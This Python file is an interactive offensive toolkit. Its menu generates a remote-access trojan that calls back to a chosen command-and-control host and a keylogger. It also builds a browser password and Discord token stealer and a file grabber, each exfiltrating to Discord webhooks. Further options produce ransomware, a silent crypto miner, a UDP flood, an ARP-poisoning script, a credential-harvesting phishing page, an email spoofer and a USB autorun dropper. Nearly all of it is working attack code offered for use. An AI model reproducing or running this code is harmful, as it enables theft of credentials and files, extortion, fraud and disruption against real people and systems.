import os
import sys
import time
import json
import socket
import struct
import base64
import shutil
import string
import random
import hashlib
import zipfile
import smtplib
import asyncio
import threading
import subprocess
import urllib.parse
import urllib.request
from pathlib import Path
from datetime import datetime

import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich import print as rprint

console = Console()

BANNER = """
[purple]
 ___  ___  _____ _____ _   _____  ___  ___  _____ ___  _     
/ __|| _ ||_   _||_ _|| | | _\ \/ __|| _ ||_   _||_ _|| |    
\__ \|   /  | |   | | | |_| v / \__ \|  _/  | |   | | | |_  
|___/|_|_\  |_|   |_| |___|_|\_\ |___/|_|    |_|  |_| |___|  
[/purple][dim]                    sativa's tool v1.0[/dim]
"""

# ── OUTPUT DIR ───────────────────────────────────────────────────────────────
OUTDIR = Path("bm_output")
OUTDIR.mkdir(exist_ok=True)

def save(tag: str, data):
    f = OUTDIR / f"{tag}_{int(time.time())}.json"
    f.write_text(json.dumps(data, indent=2))
    console.print(f"[dim]saved → {f}[/dim]")

def clear(): os.system("cls" if os.name == "nt" else "clear")

def pause(): input("\n[enter to continue]")


# ════════════════════════════════════════════════════════════════════════════
# MALWARE BUILDS
# ════════════════════════════════════════════════════════════════════════════

def rat_build():
    console.print(Panel("[bold red]RAT Builder[/bold red]"))
    host = console.input("[?] C2 host: ")
    port = console.input("[?] C2 port [4444]: ") or "4444"
    out  = console.input("[?] output filename [rat.py]: ") or "rat.py"

    src = f'''#!/usr/bin/env python3
import asyncio, os, platform, subprocess, socket, base64, json, struct

C2_HOST = "{host}"
C2_PORT = {port}
DELAY   = 10

async def shell(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr
    except Exception as e:
        return str(e)

async def connect():
    while True:
        try:
            r, w = await asyncio.open_connection(C2_HOST, C2_PORT)
            info = json.dumps({{
                "host": socket.gethostname(),
                "user": os.getlogin(),
                "os":   platform.platform(),
                "cwd":  os.getcwd(),
            }})
            w.write((info + "\\n").encode())
            await w.drain()
            while True:
                line = await r.readline()
                if not line: break
                cmd = line.decode().strip()
                if cmd == "exit": return
                if cmd.startswith("cd "):
                    try: os.chdir(cmd[3:]); out = os.getcwd()
                    except Exception as e: out = str(e)
                elif cmd.startswith("download "):
                    path = cmd[9:]
                    try:
                        data = open(path,"rb").read()
                        enc  = base64.b64encode(data).decode()
                        out  = f"FILE:{{enc}}"
                    except Exception as e: out = str(e)
                elif cmd.startswith("upload "):
                    parts = cmd.split(" ", 3)
                    try:
                        open(parts[1],"wb").write(base64.b64decode(parts[2]))
                        out = f"uploaded {{parts[1]}}"
                    except Exception as e: out = str(e)
                elif cmd == "screenshot":
                    try:
                        import PIL.ImageGrab
                        img = PIL.ImageGrab.grab()
                        import io
                        buf = io.BytesIO()
                        img.save(buf, "PNG")
                        out = "SCREEN:" + base64.b64encode(buf.getvalue()).decode()
                    except Exception as e: out = str(e)
                else:
                    out = await shell(cmd)
                w.write((out + "\\n").encode())
                await w.drain()
        except Exception:
            await asyncio.sleep(DELAY)

asyncio.run(connect())
'''
    Path(out).write_text(src)
    console.print(f"[green][+] RAT written → {out}[/green]")
    console.print(f"[dim]listener: nc -lvnp {port}[/dim]")
    pause()


def keylogger_build():
    console.print(Panel("[bold red]Keylogger Builder[/bold red]"))
    webhook = console.input("[?] Discord webhook URL (leave blank for file-only): ")
    out     = console.input("[?] output filename [kl.py]: ") or "kl.py"

    src = f'''#!/usr/bin/env python3
# pip install pynput requests
import threading, time, requests
from pynput import keyboard

LOG      = []
WEBHOOK  = "{webhook}"
INTERVAL = 60  # send every N seconds

def on_press(key):
    try:    LOG.append(key.char)
    except: LOG.append(f"[{{key.name}}]")

def sender():
    while True:
        time.sleep(INTERVAL)
        if LOG:
            chunk = "".join(LOG[:500])
            LOG.clear()
            if WEBHOOK:
                try:
                    requests.post(WEBHOOK, json={{"content": f"```{{chunk}}```"}}, timeout=8)
                except: pass
            else:
                with open("keys.txt","a") as f: f.write(chunk + "\\n---\\n")

t = threading.Thread(target=sender, daemon=True)
t.start()
with keyboard.Listener(on_press=on_press) as l:
    l.join()
'''
    Path(out).write_text(src)
    console.print(f"[green][+] keylogger written → {out}[/green]")
    pause()


def stealer_build():
    console.print(Panel("[bold red]Stealer Builder[/bold red]"))
    webhook = console.input("[?] Discord webhook: ")
    out     = console.input("[?] output [stealer.py]: ") or "stealer.py"

    src = f'''#!/usr/bin/env python3
# pip install requests cryptography pywin32
import os, json, base64, sqlite3, shutil, requests, tempfile
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

WEBHOOK = "{webhook}"
TMP     = Path(tempfile.mkdtemp())

def send(label, content):
    try:
        requests.post(WEBHOOK, json={{"content": f"**{{label}}**\\n```{{str(content)[:1800]}}```"}}, timeout=10)
    except: pass

def get_master_key(browser_path):
    local_state = Path(browser_path).parent / "Local State"
    if not local_state.exists(): return None
    data = json.loads(local_state.read_text())
    enc  = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
    import win32crypt
    return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]

def decrypt_val(key, payload):
    try:
        iv, data = payload[3:15], payload[15:]
        return AESGCM(key).decrypt(iv, data, None).decode()
    except: return ""

def steal_chromium(name, path):
    db = Path(path) / "Default/Login Data"
    if not db.exists(): return
    tmp = TMP / f"{{name}}_login.db"
    shutil.copy2(db, tmp)
    key = get_master_key(path)
    if not key: return
    con = sqlite3.connect(tmp)
    rows = con.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
    con.close()
    creds = [f"{{r[0]}} | {{r[1]}} | {{decrypt_val(key,r[2])}}" for r in rows if r[1]]
    if creds: send(f"{{name}} passwords", "\\n".join(creds))

BROWSERS = {{
    "Chrome":  os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
    "Edge":    os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
    "Brave":   os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"),
    "Opera":   os.path.expandvars(r"%APPDATA%\\Opera Software\\Opera Stable"),
}}

for name, path in BROWSERS.items():
    steal_chromium(name, path)

# discord tokens
token_paths = {{
    "Discord":        os.path.expandvars(r"%APPDATA%\\discord\\Local Storage\\leveldb"),
    "Discord Canary": os.path.expandvars(r"%APPDATA%\\discordcanary\\Local Storage\\leveldb"),
}}
import re
tokens = []
for app, tp in token_paths.items():
    for f in Path(tp).glob("*.ldb") if Path(tp).exists() else []:
        for line in f.read_text(errors="ignore").splitlines():
            for tok in re.findall(r"[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}", line):
                tokens.append(f"{{app}}: {{tok}}")
if tokens: send("Discord Tokens", "\\n".join(tokens))

# system info
import platform, socket
send("System Info", f"{{platform.node()}} | {{platform.platform()}} | {{socket.gethostbyname(socket.gethostname())}}")

shutil.rmtree(TMP, ignore_errors=True)
'''
    Path(out).write_text(src)
    console.print(f"[green][+] stealer written → {out}[/green]")
    pause()


def grabber_build():
    console.print(Panel("[bold red]Grabber Builder[/bold red]"))
    webhook = console.input("[?] Discord webhook: ")
    exts    = console.input("[?] file extensions to grab [.txt,.pdf,.docx]: ") or ".txt,.pdf,.docx"
    out     = console.input("[?] output [grabber.py]: ") or "grabber.py"

    src = f'''#!/usr/bin/env python3
import os, requests
from pathlib import Path

WEBHOOK = "{webhook}"
EXTS    = {json.dumps([e.strip() for e in exts.split(",")])}
ROOTS   = [os.path.expanduser("~")]
MAX_MB  = 8

def send_file(path):
    try:
        if os.path.getsize(path) > MAX_MB * 1024 * 1024: return
        with open(path,"rb") as f:
            requests.post(WEBHOOK, files={{"file": (os.path.basename(path), f)}}, timeout=15)
    except: pass

for root in ROOTS:
    for dirpath, _, files in os.walk(root):
        for fname in files:
            if any(fname.endswith(e) for e in EXTS):
                send_file(os.path.join(dirpath, fname))
'''
    Path(out).write_text(src)
    console.print(f"[green][+] grabber written → {out}[/green]")
    pause()


def ransomware_build():
    console.print(Panel("[bold red]Ransomware Builder[/bold red]"))
    contact = console.input("[?] contact email for ransom note: ")
    out     = console.input("[?] output [ransom.py]: ") or "ransom.py"

    src = f'''#!/usr/bin/env python3
# pip install cryptography
import os, base64
from pathlib import Path
from cryptography.fernet import Fernet

KEY  = Fernet.generate_key()
F    = Fernet(KEY)
EXTS = {{".txt",".doc",".docx",".pdf",".xls",".xlsx",".jpg",".png",".py",".js",".html"}}
NOTE = """YOUR FILES HAVE BEEN ENCRYPTED
Contact {contact} to recover your files.
Your key (keep this): """ + KEY.decode()

def encrypt_dir(root):
    for dirpath, _, files in os.walk(root):
        for fname in files:
            fp = Path(dirpath) / fname
            if fp.suffix.lower() in EXTS:
                try:
                    data = fp.read_bytes()
                    fp.write_bytes(F.encrypt(data))
                    fp.rename(str(fp) + ".locked")
                except: pass

# TARGET: os.path.expanduser("~/Desktop") — safe test target
# encrypt_dir(os.path.expanduser("~/Desktop"))
# uncomment above line to activate — runs on Desktop only for safety
print(NOTE)
(Path(os.path.expanduser("~")) / "README_DECRYPT.txt").write_text(NOTE)
print("[!] ransom note dropped. uncomment encrypt_dir() to activate encryption.")
'''
    Path(out).write_text(src)
    console.print(f"[green][+] ransomware written → {out}[/green]")
    console.print("[dim]encryption disabled by default — uncomment to activate[/dim]")
    pause()


def crypto_miner_build():
    console.print(Panel("[bold red]Crypto Miner Builder[/bold red]"))
    wallet  = console.input("[?] XMR wallet address: ")
    pool    = console.input("[?] pool [pool.supportxmr.com:3333]: ") or "pool.supportxmr.com:3333"
    out     = console.input("[?] output [miner.py]: ") or "miner.py"

    src = f'''#!/usr/bin/env python3
# downloads and silently runs xmrig
import os, urllib.request, subprocess, tempfile, sys, platform

WALLET = "{wallet}"
POOL   = "{pool}"
TMP    = tempfile.gettempdir()

XMRIG_URL = (
    "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
    if platform.system() != "Windows" else
    "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-win64.zip"
)

dest = os.path.join(TMP, "xmrig_pkg")
os.makedirs(dest, exist_ok=True)
pkg  = os.path.join(dest, "pkg")

print("[*] fetching miner...")
urllib.request.urlretrieve(XMRIG_URL, pkg)

if platform.system() == "Windows":
    import zipfile
    zipfile.ZipFile(pkg).extractall(dest)
    exe = [f for f in os.listdir(dest) if f.endswith(".exe")][0]
    binary = os.path.join(dest, exe)
else:
    import tarfile
    tarfile.open(pkg).extractall(dest)
    binary = os.path.join(dest, [d for d in os.listdir(dest) if os.path.isdir(os.path.join(dest,d))][0], "xmrig")
    os.chmod(binary, 0o755)

cmd = [binary, "-o", POOL, "-u", WALLET, "-p", "x", "--cpu-max-threads-hint=50", "--background"]
subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
print("[+] miner running in background")
'''
    Path(out).write_text(src)
    console.print(f"[green][+] miner builder written → {out}[/green]")
    pause()


# ════════════════════════════════════════════════════════════════════════════
# NETWORK TOOLS
# ════════════════════════════════════════════════════════════════════════════

def ip_tool():
    console.print(Panel("[bold cyan]IP Tool[/bold cyan]"))
    target = console.input("[?] IP or domain: ")
    try:
        resolved = socket.gethostbyname(target)
    except Exception:
        resolved = target

    r = requests.get(f"http://ip-api.com/json/{resolved}?fields=66846719", timeout=8)
    data = r.json()
    t = Table(show_header=False, box=None)
    for k, v in data.items():
        t.add_row(f"[dim]{k}[/dim]", str(v))
    console.print(t)
    save("ip_lookup", data)
    pause()


def port_scanner():
    console.print(Panel("[bold cyan]Port Scanner[/bold cyan]"))
    target  = console.input("[?] host: ")
    ports   = console.input("[?] port range [1-1024]: ") or "1-1024"
    start, end = map(int, ports.split("-"))
    resolved = socket.gethostbyname(target)
    console.print(f"[*] scanning {resolved} ports {start}-{end}...")
    open_ports = []

    def scan(port):
        try:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((resolved, port)) == 0:
                try:    banner = s.recv(64).decode(errors="ignore").strip()
                except: banner = ""
                open_ports.append((port, banner))
                console.print(f"[green]  {port:5d}/tcp  open  {banner}[/green]")
            s.close()
        except: pass

    threads = []
    for p in range(start, end+1):
        t = threading.Thread(target=scan, args=(p,))
        threads.append(t)
        t.start()
        if len(threads) >= 200:
            for t in threads: t.join()
            threads.clear()
    for t in threads: t.join()

    console.print(f"\n[+] {len(open_ports)} open ports found")
    save("portscan", {"host": resolved, "ports": open_ports})
    pause()


def email_tool():
    console.print(Panel("[bold cyan]Email Tool[/bold cyan]"))
    domain = console.input("[?] domain to enumerate: ")
    r = requests.get(f"https://hunter.io/v2/domain-search?domain={domain}&api_key=free", timeout=8)
    # hunter free tier — limited but functional
    emails = []
    try:
        data = r.json()
        for e in data.get("data", {}).get("emails", []):
            emails.append(e.get("value",""))
            console.print(f"  [green]{e.get('value','')}[/green]  [dim]{e.get('position','')}[/dim]")
    except: pass

    # google dork fallback
    console.print(f"\n[*] google dork → site:{domain} email")
    console.print(f"[dim]https://www.google.com/search?q=site:{domain}+%22%40{domain}%22[/dim]")

    save("emails", {"domain": domain, "emails": emails})
    pause()


def phone_lookup():
    console.print(Panel("[bold cyan]Phone Lookup[/bold cyan]"))
    number = console.input("[?] phone number (+1xxxxxxxxxx): ")
    r = requests.get(f"https://phonevalidation.abstractapi.com/v1/?api_key=free&phone={number}", timeout=8)
    try:
        data = r.json()
        t = Table(show_header=False, box=None)
        for k, v in data.items():
            t.add_row(f"[dim]{k}[/dim]", str(v))
        console.print(t)
        save("phone", data)
    except:
        console.print("[dim]API key needed — sign up free at abstractapi.com[/dim]")
    pause()


def web_scanner():
    console.print(Panel("[bold cyan]Web Scanner[/bold cyan]"))
    url = console.input("[?] target URL (https://...): ")
    headers_r = requests.get(url, timeout=8, allow_redirects=True)
    console.print("\n[bold]response headers:[/bold]")
    for k, v in headers_r.headers.items():
        console.print(f"  [dim]{k}:[/dim] {v}")

    # common paths
    paths = [
        "/.env", "/admin", "/login", "/wp-admin", "/phpmyadmin",
        "/config.php", "/.git/config", "/api/v1", "/swagger",
        "/robots.txt", "/sitemap.xml", "/.htaccess", "/backup.zip",
        "/debug", "/console", "/.DS_Store",
    ]
    console.print("\n[bold]path probe:[/bold]")
    found = []
    for path in paths:
        try:
            r = requests.get(url.rstrip("/")+path, timeout=4, allow_redirects=False)
            color = "green" if r.status_code < 400 else "dim"
            console.print(f"  [{color}]{r.status_code}  {path}[/{color}]")
            if r.status_code < 400:
                found.append({"path": path, "status": r.status_code})
        except: pass

    save("webscan", {"url": url, "found": found})
    pause()


def ddos_tool():
    console.print(Panel("[bold red]UDP Flood[/bold red]"))
    host    = console.input("[?] target host/IP: ")
    port    = int(console.input("[?] target port: "))
    dur     = int(console.input("[?] duration seconds: "))
    threads = int(console.input("[?] threads [50]: ") or "50")
    payload = random._urandom(1024)
    stop    = threading.Event()
    sent    = [0]

    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        target_ip = socket.gethostbyname(host)
        while not stop.is_set():
            try:
                s.sendto(payload, (target_ip, port))
                sent[0] += 1
            except: pass

    console.print(f"[red][*] flooding {host}:{port} for {dur}s with {threads} threads[/red]")
    pool = [threading.Thread(target=flood, daemon=True) for _ in range(threads)]
    for t in pool: t.start()
    time.sleep(dur)
    stop.set()
    console.print(f"[green][+] done — {sent[0]:,} packets sent[/green]")
    pause()


def mitm_tool():
    console.print(Panel("[bold cyan]Man in the Middle — ARP Poison[/bold cyan]"))
    console.print("[dim]requires scapy: pip install scapy[/dim]")
    target_ip  = console.input("[?] target IP: ")
    gateway_ip = console.input("[?] gateway IP: ")
    iface      = console.input("[?] interface [eth0]: ") or "eth0"

    src = f'''#!/usr/bin/env python3
# pip install scapy
import time, os
from scapy.all import ARP, Ether, sendp, get_if_hwaddr

def get_mac(ip):
    from scapy.all import srp
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    return ans[0][1].hwsrc if ans else None

TARGET  = "{target_ip}"
GATEWAY = "{gateway_ip}"
IFACE   = "{iface}"

target_mac  = get_mac(TARGET)
gateway_mac = get_mac(GATEWAY)
my_mac      = get_if_hwaddr(IFACE)

print(f"target  {{TARGET}} → {{target_mac}}")
print(f"gateway {{GATEWAY}} → {{gateway_mac}}")

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def poison():
    # tell target: I am the gateway
    pkt1 = Ether(dst=target_mac)/ARP(op=2, pdst=TARGET, hwdst=target_mac, psrc=GATEWAY)
    # tell gateway: I am the target
    pkt2 = Ether(dst=gateway_mac)/ARP(op=2, pdst=GATEWAY, hwdst=gateway_mac, psrc=TARGET)
    sendp([pkt1, pkt2], iface=IFACE, verbose=False)

try:
    print("[*] poisoning — ctrl+c to stop")
    while True:
        poison()
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] restoring ARP tables...")
    fix1 = Ether(dst=target_mac)/ARP(op=2, pdst=TARGET, hwdst=target_mac, psrc=GATEWAY, hwsrc=gateway_mac)
    fix2 = Ether(dst=gateway_mac)/ARP(op=2, pdst=GATEWAY, hwdst=gateway_mac, psrc=TARGET, hwsrc=target_mac)
    sendp([fix1, fix2], count=5, iface=IFACE, verbose=False)
    print("[+] restored")
'''
    Path("mitm.py").write_text(src)
    console.print("[green][+] mitm.py written[/green]")
    pause()


# ════════════════════════════════════════════════════════════════════════════
# PANEL & TOOLS
# ════════════════════════════════════════════════════════════════════════════

def bruteforce_zip():
    console.print(Panel("[bold yellow]Bruteforce ZIP[/bold yellow]"))
    zippath  = console.input("[?] path to zip: ")
    wordlist = console.input("[?] wordlist path: ")
    try:
        zf = zipfile.ZipFile(zippath)
    except Exception as e:
        console.print(f"[red][-] {e}[/red]") ; pause() ; return

    found = False
    with open(wordlist, "r", errors="ignore") as wl:
        for i, line in enumerate(wl):
            pw = line.strip()
            try:
                zf.extractall(pwd=pw.encode())
                console.print(f"[green][+] password found: {pw}[/green]")
                found = True
                break
            except: pass
            if i % 500 == 0:
                console.print(f"[dim]  tried {i:,}...[/dim]", end="\r")
    if not found:
        console.print("[red][-] not found in wordlist[/red]")
    pause()


def obfuscator():
    console.print(Panel("[bold yellow]Python Obfuscator[/bold yellow]"))
    src_path = console.input("[?] source .py file: ")
    out_path = console.input("[?] output file [obf.py]: ") or "obf.py"
    try:
        code = Path(src_path).read_bytes()
        b64  = base64.b64encode(code).decode()
        result = f'import base64,marshal,types\nexec(compile(base64.b64decode("{b64}").decode(),"<string>","exec"))\n'
        # second layer
        b64_2   = base64.b64encode(result.encode()).decode()
        final   = f'exec(__import__("base64").b64decode("{b64_2}").decode())\n'
        Path(out_path).write_text(final)
        console.print(f"[green][+] obfuscated → {out_path}[/green]")
    except Exception as e:
        console.print(f"[red][-] {e}[/red]")
    pause()


def token_panel():
    console.print(Panel("[bold yellow]Discord Token Checker[/bold yellow]"))
    token = console.input("[?] token: ")
    r = requests.get("https://discord.com/api/v9/users/@me",
                      headers={"Authorization": token}, timeout=8)
    if r.status_code == 200:
        d = r.json()
        console.print(f"[green][+] valid token[/green]")
        console.print(f"  user:     {d.get('username')}#{d.get('discriminator')}")
        console.print(f"  id:       {d.get('id')}")
        console.print(f"  email:    {d.get('email')}")
        console.print(f"  phone:    {d.get('phone')}")
        console.print(f"  nitro:    {bool(d.get('premium_type'))}")
        console.print(f"  mfa:      {d.get('mfa_enabled')}")
        save("token", d)
    else:
        console.print(f"[red][-] invalid ({r.status_code})[/red]")
    pause()


def usb_tool():
    console.print(Panel("[bold yellow]USB Dropper Builder[/bold yellow]"))
    payload = console.input("[?] payload script to drop (path): ")
    out     = console.input("[?] output autorun package dir [usb_drop]: ") or "usb_drop"
    od = Path(out)
    od.mkdir(exist_ok=True)
    shutil.copy2(payload, od / Path(payload).name)
    autorun = f"[autorun]\nopen={Path(payload).name}\naction=Open folder to view files\nicon=%SystemRoot%\\system32\\shell32.dll,4\n"
    (od / "autorun.inf").write_text(autorun)
    console.print(f"[green][+] USB dropper package → {out}/[/green]")
    console.print("[dim]copy folder contents to root of USB drive[/dim]")
    pause()


def database_search():
    console.print(Panel("[bold yellow]Breach Database Search[/bold yellow]"))
    query = console.input("[?] email or username: ")
    # HIBP public API — no key needed for basic check
    r = requests.get(
        f"https://haveibeenpwned.com/api/v3/breachedaccount/{urllib.parse.quote(query)}",
        headers={"User-Agent": "BlueMagic-OSINT"},
        timeout=8
    )
    if r.status_code == 200:
        breaches = r.json()
        console.print(f"[red][!] found in {len(breaches)} breaches:[/red]")
        for b in breaches:
            console.print(f"  [red]•[/red] {b.get('Name')}  [dim]{b.get('BreachDate')}[/dim]")
        save("breaches", breaches)
    elif r.status_code == 404:
        console.print("[green][+] not found in known breaches[/green]")
    else:
        console.print(f"[dim]status {r.status_code} — HIBP may require API key for full access[/dim]")
    pause()


def temp_mail():
    console.print(Panel("[bold yellow]Temp Mail[/bold yellow]"))
    r = requests.get("https://api.guerrillamail.com/ajax.php?f=get_email_address", timeout=8)
    data   = r.json()
    addr   = data["email_addr"]
    sid_token = data["sid_token"]
    console.print(f"[green][+] temp address: {addr}[/green]")
    console.print("[*] checking inbox every 5s — ctrl+c to stop")
    seen = set()
    try:
        while True:
            time.sleep(5)
            inbox = requests.get(
                f"https://api.guerrillamail.com/ajax.php?f=get_email_list&offset=0&sid_token={sid_token}",
                timeout=8
            ).json()
            for mail in inbox.get("list", []):
                mid = mail.get("mail_id")
                if mid not in seen:
                    seen.add(mid)
                    console.print(f"\n[green]  from: {mail.get('mail_from')}[/green]")
                    console.print(f"  subj: {mail.get('mail_subject')}")
                    detail = requests.get(
                        f"https://api.guerrillamail.com/ajax.php?f=fetch_email&email_id={mid}&sid_token={sid_token}",
                        timeout=8
                    ).json()
                    body = detail.get("mail_body","")
                    from bs4 import BeautifulSoup
                    console.print(f"  body: {BeautifulSoup(body,'html.parser').get_text()[:500]}")
    except KeyboardInterrupt:
        pass
    pause()


def proxy_tool():
    console.print(Panel("[bold yellow]Proxy Scraper[/bold yellow]"))
    console.print("[*] fetching fresh proxies...")
    sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    ]
    proxies = set()
    for url in sources:
        try:
            r = requests.get(url, timeout=8)
            for line in r.text.splitlines():
                line = line.strip()
                if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line):
                    proxies.add(line)
        except: pass

    console.print(f"[*] testing {len(proxies)} proxies...")
    working = []
    lock    = threading.Lock()

    def test(proxy):
        try:
            r = requests.get("http://ip-api.com/json",
                             proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
                             timeout=4)
            if r.status_code == 200:
                with lock:
                    working.append(proxy)
                    console.print(f"[green]  ✓ {proxy}[/green]")
        except: pass

    pool = []
    for px in list(proxies)[:200]:
        t = threading.Thread(target=test, args=(px,))
        pool.append(t) ; t.start()
        if len(pool) >= 50:
            for t in pool: t.join()
            pool.clear()
    for t in pool: t.join()

    out = OUTDIR / "proxies.txt"
    out.write_text("\n".join(working))
    console.print(f"[green][+] {len(working)} working proxies → {out}[/green]")
    pause()


# ════════════════════════════════════════════════════════════════════════════
# SCAM TOOLS
# ════════════════════════════════════════════════════════════════════════════

def phishing_builder():
    console.print(Panel("[bold red]Phishing Page Builder[/bold red]"))
    template = console.input("[?] template [discord/google/instagram]: ") or "discord"
    out_dir  = console.input("[?] output dir [phish]: ") or "phish"
    webhook  = console.input("[?] Discord webhook for creds: ")
    od = Path(out_dir) ; od.mkdir(exist_ok=True)

    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>{"Discord" if template=="discord" else "Google"} Login</title>
<style>
  * {{ box-sizing:border-box; margin:0; padding:0; }}
  body {{ background:#313338; display:flex; justify-content:center; align-items:center; height:100vh; font-family:"gg sans","Noto Sans",sans-serif; }}
  .box {{ background:#2b2d31; border-radius:8px; padding:32px; width:480px; }}
  h2 {{ color:#fff; font-size:24px; margin-bottom:8px; }}
  p  {{ color:#b5bac1; font-size:14px; margin-bottom:20px; }}
  input {{ width:100%; padding:10px; background:#1e1f22; border:1px solid #1e1f22; border-radius:4px; color:#fff; font-size:16px; margin-bottom:12px; }}
  button {{ width:100%; padding:10px; background:#5865f2; color:#fff; border:none; border-radius:4px; font-size:16px; cursor:pointer; }}
  button:hover {{ background:#4752c4; }}
</style>
</head>
<body>
<div class="box">
  <h2>Welcome back!</h2>
  <p>We're so excited to see you again!</p>
  <input type="email"    id="em" placeholder="Email or Phone Number">
  <input type="password" id="pw" placeholder="Password">
  <button onclick="go()">Log In</button>
</div>
<script>
async function go(){{
  const em=document.getElementById("em").value;
  const pw=document.getElementById("pw").value;
  if(!em||!pw)return;
  await fetch("{webhook}",{{
    method:"POST",
    headers:{{"Content-Type":"application/json"}},
    body:JSON.stringify({{content:"**PHISH**\\n**email:** "+em+"\\n**pass:** "+pw}})
  }});
  window.location="https://discord.com/login";
}}
</script>
</body>
</html>'''

    (od / "index.html").write_text(html)
    console.print(f"[green][+] phishing page → {out_dir}/index.html[/green]")
    console.print(f"[dim]serve with: python -m http.server 80[/dim]")
    pause()


def spoofer():
    console.print(Panel("[bold red]Email Spoofer[/bold red]"))
    smtp    = console.input("[?] SMTP host: ")
    port    = int(console.input("[?] SMTP port [587]: ") or "587")
    user    = console.input("[?] SMTP user: ")
    pw      = console.input("[?] SMTP password: ")
    from_   = console.input("[?] spoof from address: ")
    to      = console.input("[?] send to: ")
    subject = console.input("[?] subject: ")
    body    = console.input("[?] body: ")
    try:
        s = smtplib.SMTP(smtp, port, timeout=10)
        s.starttls()
        s.login(user, pw)
        msg = f"From: {from_}\r\nTo: {to}\r\nSubject: {subject}\r\n\r\n{body}"
        s.sendmail(from_, to, msg)
        s.quit()
        console.print("[green][+] sent[/green]")
    except Exception as e:
        console.print(f"[red][-] {e}[/red]")
    pause()


def cc_validator():
    console.print(Panel("[bold red]Card Validator (Luhn)[/bold red]"))
    card = console.input("[?] card number: ").replace(" ","").replace("-","")
    def luhn(n):
        digits = [int(d) for d in n][::-1]
        total  = 0
        for i, d in enumerate(digits):
            if i%2==1:
                d*=2
                if d>9: d-=9
            total+=d
        return total%10==0
    valid = luhn(card)
    iin   = card[:6]
    console.print(f"  luhn:    [{'green' if valid else 'red'}]{'PASS' if valid else 'FAIL'}[/{'green' if valid else 'red'}]")
    console.print(f"  network: {'Visa' if card[0]=='4' else 'Mastercard' if card[0]=='5' else 'Amex' if card[:2] in ('34','37') else 'Unknown'}")
    console.print(f"  length:  {len(card)}")
    pause()


# ════════════════════════════════════════════════════════════════════════════
# MENU
# ════════════════════════════════════════════════════════════════════════════

MENU = {
    "MALWARE BUILD": [
        ("01", "RAT Build",          rat_build),
        ("02", "Keylogger Build",    keylogger_build),
        ("03", "Stealer Build",      stealer_build),
        ("04", "Grabber Build",      grabber_build),
        ("05", "Ransomware Build",   ransomware_build),
        ("06", "Crypto Miner Build", crypto_miner_build),
    ],
    "SCAM": [
        ("11", "Phishing Builder",   phishing_builder),
        ("12", "CC Validator",       cc_validator),
        ("13", "Email Spoofer",      spoofer),
        ("14", "Temp Mail",          temp_mail),
    ],
    "PANEL & TOOLS": [
        ("21", "Bruteforce ZIP",     bruteforce_zip),
        ("22", "Obfuscator",         obfuscator),
        ("23", "Token Panel",        token_panel),
        ("24", "USB Tool",           usb_tool),
        ("25", "Database Search",    database_search),
        ("26", "Proxy Tool",         proxy_tool),
    ],
    "NETWORK": [
        ("31", "IP Tool",            ip_tool),
        ("32", "Port Scanner",       port_scanner),
        ("33", "Email Tool",         email_tool),
        ("34", "Phone Lookup",       phone_lookup),
        ("35", "Web Scanner",        web_scanner),
        ("36", "DDoS (UDP Flood)",   ddos_tool),
        ("37", "Man in the Middle",  mitm_tool),
    ],
}

DISPATCH = {}
for section, items in MENU.items():
    for num, name, fn in items:
        DISPATCH[num] = fn


def draw_menu():
    clear()
    console.print(BANNER)
    cols = list(MENU.keys())
    tables = []
    for section in cols:
        t = Table(
            title=f"[bold]{section}[/bold]",
            show_header=False,
            box=None,
            padding=(0,1),
        )
        for num, name, _ in MENU[section]:
            t.add_row(f"[dim]\\[{num}][/dim]", name)
        tables.append(t)

    # print side by side via columns
    from rich.columns import Columns
    console.print(Columns(tables, equal=True, expand=True))
    console.print()


def main():
    while True:
        draw_menu()
        choice = console.input("[bold purple]>[/bold purple] ").strip()
        if choice.lower() in ("q", "quit", "exit"):
            console.print("[dim]bye[/dim]")
            sys.exit(0)
        fn = DISPATCH.get(choice)
        if fn:
            clear()
            fn()
        else:
            console.print("[dim]unknown option[/dim]")
            time.sleep(0.8)


if __name__ == "__main__":
    main()